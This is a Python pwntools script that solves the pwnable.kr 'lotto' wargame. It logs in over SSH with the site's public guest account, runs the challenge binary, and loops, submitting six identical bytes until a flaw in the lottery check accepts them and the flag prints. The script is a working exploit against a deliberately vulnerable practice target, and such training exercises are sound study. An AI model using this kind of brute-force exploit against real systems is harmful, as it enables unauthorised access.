#!/usr/bin/env python3

from pwn import *

# connect to lotto executable on server
conn = ssh(user='lotto', host='pwnable.kr', port=2222, password='guest')
io = conn.process(executable='./lotto')

for _ in range(1000):
    io.sendlineafter(b'3. Exit\n', b'1')
    io.sendlineafter(b"Submit your 6 lotto bytes : ", b'-'*6)
    io.recvline()
    flag = io.recvline()

    if b'bad' not in flag:
        print('Flag:', flag.decode())
        break

# exit connection
io.close()
conn.close()

